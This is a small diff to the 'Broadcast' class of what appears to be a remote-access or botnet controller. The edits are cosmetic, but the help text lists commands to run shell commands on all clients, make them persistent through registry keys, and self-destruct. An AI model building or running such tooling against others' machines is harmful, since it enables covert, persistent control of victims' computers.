@@ -18,17 +18,19 @@ class Broadcast:
     def help(self):
         '''-h or --help'''
         printColor("help","""
+
 -h or --help : Displays all session mode commands.
 
 -ls or --list : Displays all clients with their information.
 
 -c : Executes a command on all clients and does not send the result (don't forget to put the command in quotation marks). 
 
--p or --persistence : Makes all clients persistent at startup by modifying the registry keys.
+--persistence : Makes all clients persistent at startup by modifying the registry keys.
 
 --destruction : Removes all clients on all clients and cuts connections.
 
 -b or --back : Back to menu.
+
 """) 
 
     def aSingleRunMod(self):
@@ -69,7 +71,7 @@ class Broadcast:
     def executeCommand(self,cmd_list):
         '''-c'''
        # print("-->",cmd_list)
-        print("\n")
+        
         cmd_list.pop(0) #delete "-c"
         
         tmp_cmd = " ".join(cmd_list) #list to string
@@ -102,7 +104,7 @@ class Broadcast:
 
         if(areYouSure()):
             request = "MOD_DESTRUCTION:broadcast"
-            print("\n")
+            
         
             for key in dict_sorts.keys():
                
